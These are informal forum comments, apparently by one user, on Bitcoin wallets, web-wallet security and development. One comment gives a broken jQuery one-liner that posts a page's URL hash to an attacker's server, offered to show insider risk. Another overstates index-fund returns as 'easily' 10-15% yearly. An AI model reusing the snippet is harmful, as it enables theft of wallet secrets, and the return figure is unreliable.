From a programmers perspective, the url hash is no special. It's just a variable in the program, and it's location is `window.location.hash`. In a program we make a thousand variables, this is one of them. The only difference between that one and all others is that the user can see it, and bookmark it. 
Anything a programmer can do in the app, they can also do with the hash. I don't think anyone understands just how much trust we give the random strangers who just happen to be working with programming computers.

With BitPay you can chose to have x% in btc and the rest in fiat. So as more suppliers in the supply chain take bitcoin, everyone will adjust the btc % to be higher.

I guess many OTC sellers get their coins from an exchange, so that doesn't work in your favour then... 
If you buy from miners maybe, but that just means that you're moving some selling pressure from the sellers exchange account to your own, +-0. 
I've got a crazy idea: speculators are going crazy with a highly volatile new asset that no one knows the right price for, resulting in crazy bubbles and crazy crashes. That would explain everything that the speculators of this highly volatile new asset are doing!

1. Download ubuntu live CD, burn it, and boot from it. 
2. When in Ubuntu, get Electrum. 
3. Have it make a new wallet. You'll get 5 addresses generated for you. Sweet! 
4. Write these down somewhere you'll remember. Post them to the internet, whatever (but make sure to be anon - you don't want everyone and their grandpa knowing how much you own)
5. Electrum will give you a 'seed'. That's really just a private key, but each number is matched to a word in a dictionary, so it's easy for us stupid homo sapiens to think about. Write this down on a peace of paper. Put that paper in a safe you rent in the bank. Get a second bank vault, and have the same text in a note there (if the first bank gets bombed/has a meteorite hit it). 
6. Send money to the addresses you got. When it's time to retire, head to the vault and put the text into a fresh electrum. 
It takes an evening if you're a newbie, and people on the internet wanna help you. 
Web wallets are made by programmers, and programmers are (just like the rest of us) stupid animals evolved from monkeys. Programming is really hard for homo sapiens, and fuck ups are the rule, not exception. Have you ever seen a program's code? It looks like gibberish? A programmer can read it, but it's still fucking complex for our monkey brains. We may not be as bad programmers as Mark Karpeles, but we still fuck up, and do it often. It takes just one fuck up to leave Coinbase's bitcoins vulnerable to theft. It's going to happen, and everyone who has worked on big programming projects knows that bugs are common. Seriously, it's a matter of when, not if. It's going to happen, I promise you. 
So your choices are: 
* do an evening of work to set yourself up or 
* have your coins stolen in a few years time, and due to some part of the user agreement your didn't read you get null back. 
I'm sorry that you have to go thru work to keep it safe, but that's how it is.

No, but someone having access to the repo or server can just quickly add a function. They already know the code since you can just 'inspect page' to read the source. 
So someone who is watching a movie with a dev on the project can just quickly add that and make a commit when the dev is on the jug. This shit happens. 
They just make a JS function that on the event `documentready` sends the hash to some web server. 
Something like this would do the trick:
 $.post(' window.location.hash);
That one line of code (if the jQuery library is loaded in the webapp, otherwise it's like 2 lines) sends the hash to some server that the attacker controls. Super easy! Just add that to the code, and make it run when the page is loaded, and you're good to go. 
Most developers I know (myself included, I guess) have a million things on their agendas, and to be paranoid about security is not  on the list.

If you don't work professionally as a developer, you're unlikely to get exposed to the width of the work. If you become an apprentice at some development company, you can learn to create applications, you can learn debugging (seriously, coding is 20% creating shit and 80% debugging it). 
Something very important you can do is to learn not programming, but how to implement design in programs. For web applications (and many desktop and mobile ones, nowadays) CSS and HTML is the languages we use to implement design. Satoshi's bitcoin client's design is implemented in QT. 
If you learn to design web and other applications, you can also make a hell of a good living from it, just saying ;).

It's kinda silly, but I think of computers and the internet as a second world we humans created. It's like people in the old world viewed America when they discovered it, but even more groundbreaking. 
In this new world we made, other laws of nature apply. In the old world (meatspace) we have the laws of physics. In the new world (I won't use the word 'cyberspace', but I mean 'cyberspace') the laws of computation are ruling. 
When I learned to program and create networked applications, it was like becoming a wizard but in a new world, that at the time and still was and is unexplored virgin land for human mind and exploration. 
In the meat world, the old world, you can't copy things, you can't create things out of thin air, gravity pulls matter together. Our bodies are the interface between our minds and this world. 
In the computers world, our interface is (right now) the keyboard, microphone, loudspeaker and the screens. 
The biggest thing to happen in the new world right now is bitcoin. We who live parts of our lives in the new world at this time have the chance to take part in this! We are still the early settlers in the new world (except this time no native people are being slaughtered like when Europeans went to America, thank god). 
That's why it's important to fight for our right to copy freely, to keep internet infrastructure out of the hands of gov's and companies with interests against our new world, and to make our new world a thriving one. Bitcoin is a big step in that.

Of course it's unsafe, there's no computer program you can consider safe. It's all a spaghetti code patchwork held together with duct tape, every program ever made (almost). You OS, your browser, you email client (except for MUTT), any program you use is ridden with security holes. Seriously, anyone spending a few years in software development knows this. 
It's not the worst though. The developers and the people controlling the server the app is hosted on have full control over your bitcoin, and can if they want let google or the US gov or whoever know you were there. So it's not to be considered very anonymous. 
If it's a team of 10 developers/testers/etc, and one of them feels like stealing a lot of money, they can easily do so by putting some bad code there. Most shops have bad practices about that, so anyone can just put whatever they want on the server. Including wallet-stealing code. (like if one wallet has &gt;50btc, then send it to address xyz). 
But it's better than any app you download and run on your computer or phone. Because javascript in any modern browser (Chrome, Safari, Firefox, etc) runs 'sandboxed'. That means a javascript program running in a browser tab can't read your files, can't run programs on your computer, can't do anything. It basically only has access to what's on the page right now (and localStorage and cookies, but that's another story). 
**TLDR**: It's unsafe as f\*$k, but that's **true for every program you've ever ran**, in your browser or outside of it. Same goes for whatever you get in any app store (no one reads the code, no one know's what the programmer told the program to do under the hood). But anything that runs in your browser is ok good. Make sure you use HTTPS that gives no errors (bad certificate, whatever), you'll probably be fine but remember that anyone with access to the server or the code (and their 'friend' who just wants to borrow their computer to check something quick on google). 
Footnote: By the way, imagine you're a developer. You have a super shiny laptop you use for work, and you also use it at home. For devs, what is work and home is kinda blurred often. You're at home, drinking wine eating popcorn with your cool hacker boyfriend/girlfriend. You go to the toilet without locking your computer. Pam! They add a small line to the code the on a given date sends all money to them.

Please don't! Letting the user choose sounds good because everyone can be happy, but having more configuration adds bloat. Good software is simple to use. Having one way everyone does it is even better than everyone being able to set it to whatever they want. 
At least do not let users set it in the GUI, if they can change settings in some `.py` file that's ok, but KISS.

Many recommend C++ or any other super-low-level language. Why? What's useful about managing memory, when it's the year of the lord 2014?

**In reply to OP:**

Mt.Gox, MyBitcoin, Tradehill and countless other web wallets are good examples. 
How can an average non-programming computer user know to care about code review, open source, and having insight in who can push code to the repo or server? I mean, in the best of worlds you're right but bosses in companies want only one thing, and that is to *ship it*. Preferably yesterday. 
I think it's unwise to trust the exchanges we use now too. I mean, Bitstamp and Bitfinex. We can't read their source code, users don't know who can deploy to their production server, anything. We're totally left to the mercy of their dev teams and project managers. Both of these will lose all their bitcions (if they don't shut down business before).

That sounds nice, and kinda similar to BitPay. 
With BitPay you create an invoice object with a status (new, paid, expired, etc), a web url the user can click to get a qr code and whatever. You can when creating the invoice set a ping back url, like you explain on block chain, or you can poll the server "get /invoice/{invoice_id}" and check the status field of the json returned. 
Haven't tried Blockchain, but seems they both work pretty similarly.

I know chrome runs all extensions in their own processes (so their own memory too) and there's no way they can read the same memory as a browser tab process (and they don't have access to the JS objects (`window`, `document`) of any tab.

Ok kids, here's a little lesson in hacking the browser mainframe AI guy. 
In Chrome or Safari or Firefox or whatever open the console. Usually done with ctrl-alt-j or cmd-c or whatever. If you're unsure, find some menu named "developer" or something. Type in the console
and hit enter. That get's the hash, and you can do whatever with it in your code. If you want to set the hash, you type
`window.location.hash = "look ma, I'm programming a computer!"`
and then look at the change in your URL bar. Fun, fun fun! 
This means the programmer of a web app has just as much control over reading and changing the location hash as she has over the actual page. Now you know!

Still very many kronur I guess (1 isk = $0.009)

Honestly, no one knows. People on the bitcoin subs and forums are having hard-ons because many get pretty rich, and because the tech is absolutely groundbreaking (anonymous instant cheap worldwide transactions, not controlled by banks and gov's but by code). 
But if the the EU and USA decides to criminalise possession and use of Bitcoin, it wouldn't be useful for anything that wasn't already illegal (drug trade, prostitution, gambling etc). Any money you were counting on cashing out would be gone in an instant. They could have these meetings in secret (we have no reason to trust the EU and USA's gov's when it comes to transparency). It's like a dandelion waiting to be blown. 
These powerful organisations seem positive to bitcoin though, so I personally think we'll be fine, but if I bet my house on it I just might end up homeless. 
Remember that you can easily get 10-15% return per year from investing in index funds. For 100.000$ means about 1000$/month back, so living rent free for the rest of your live. Making safe and sound investments is not a bad idea.
BUT: it's equally likely, or more likely, that bitcoin will change the world, and finance will never be the same again. If that happens, owning 1 bitcoin will make you economically safe for life. My advice is to keep yourself safe. If you're young, invest 7% of your monthly pay in bitcoin, 8% in stocks/bonds. Keep your head cool.

Isn't it right of us to ask anyone handling our money to have *full transparency*?
To demand every exchange to open source their code, so bugs can be found and fixed by millions. Now they can be found by anyone, but only understood and fixed by very few (who work at the exchange). 
We should demand that every transaction and trade is public. We should know the public keys of the cold storages they use. 
Tradehill, Mtgox and many other's have failed us by not doing this, and we keep buying it. 
I demand transparency! Let me inspect the transactions, let me read the source code!

Port it yourself, and if you can't put money in a bounty that will be given to someone who does it for you. Many of us programmers gladly work for scraps if it's open source and for a good cause.

That plus the mining reward halves every 4 years, next up is 2016. With the value of a btc rising, the tx fees are not gonna reach the levels of the mining rewards given, so investing in GH's is a bad idea.

I think the bubble apologisers claim last one started with Chinese traders getting in the game, and willy was just a piss in the ocean in comparison. I don't know whats true or not, but I assume the price is manipulated either way, Willy or not.

It's not about patching software, it's about not putting complex decisions right in the users face. Less is more!

It kinda goes hand in hand, right? 
For it to be a viable means of transaction, we need to know it's true value. That's what the market decides. And the price of a bitcoin is also set by the (expectations) of it's usefulness. 
What we can do is to relax and try to be on the right side of future history.

We'd all love it if you were right, but (at least in the English language) you can get away with saying "America" and meaning "The USA". 
The rest of us will just have to swallow our jealousy of big bro' USA!

Why would a government, a relic from the industrial age, want to embrace the currency of the information age? Not going to happen

It most absolutely is! People who hire in cool programming companies also love cool tech. OB is a hundred times cooler than someone putting out a hundred php/mysql web sites.

Meet in a public space, a coffeeshop with wifi. Go with a friend. 
I've made many friends thru localbitcoins, only had good experiences.

Bitcoin has no rules, that's what's so fun about it! A fugitive, a 16 year old, a single parent, a beggar, a CEO and the pizza deliverer all are equally free with bitcoin!

Why would it be? Can you not use the RPC to the satoshi client? 
Also, a newbie who doesn't get programming will not be able to send code to any bitcoin client in a long time. They need to learn to understand computation. Lisp is great for that, since it's like writing an AST.
